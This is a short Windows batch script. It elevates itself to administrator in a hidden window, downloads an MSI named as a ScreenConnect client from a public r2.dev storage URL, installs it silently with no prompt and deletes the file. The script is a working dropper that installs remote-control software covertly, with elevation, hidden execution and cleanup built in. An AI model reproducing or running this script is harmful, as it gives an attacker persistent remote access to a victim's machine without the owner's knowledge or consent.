@echo off
setlocal

REM =================================================================
REM  1. Self-Elevation (Modern, Hidden Window)
REM =================================================================
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -NoProfile -Command "Start-Process -FilePath '%~f0' -Verb RunAs -WindowStyle Hidden"
    exit /b
)

REM =================================================================
REM  2. Main Logic (Runs as Admin)
REM =================================================================

REM --- Configuration ---
set "MSI_URL=https://pub-ade5a8f498114bee990e8ff001f3c6e2.r2.dev/install-1.msi"
set "MSI_PATH=%TEMP%\ScreenConnectClient_%RANDOM%.msi"

REM --- Download ---
echo Downloading installer...
curl -L -o "%MSI_PATH%" "%MSI_URL%" --silent --show-error
if errorlevel 1 (
    echo Download failed.
    exit /b 1
)

REM --- Install ---
echo Installing application...
msiexec /i "%MSI_PATH%" /qn /norestart

REM --- Cleanup ---
del "%MSI_PATH%" /f /q >nul 2>&1

exit /b 0